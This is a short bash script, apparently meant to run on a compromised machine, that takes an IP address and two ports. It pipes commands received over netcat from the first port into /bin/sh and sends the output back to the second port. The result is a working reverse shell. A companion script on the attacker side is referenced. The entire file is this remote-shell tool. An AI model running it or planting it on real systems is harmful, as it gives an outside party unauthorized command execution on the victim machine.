#!/bin/bash

# Usage: ./target.sh [ip address] [port1] [port2]
IPv4=$1
PORT1=$2
PORT2=$3

echo "[*] Now enter commands in the terminal running shovel-input.sh"
echo "[*] Ctrl-D to exit"
echo "=============================================================="
nc -vn $IPv4 $PORT1 | /bin/sh | nc -vn $IPv4 $PORT2 > /tmp/foo.bar

# clean up when exiting
rm /tmp/foo.bar
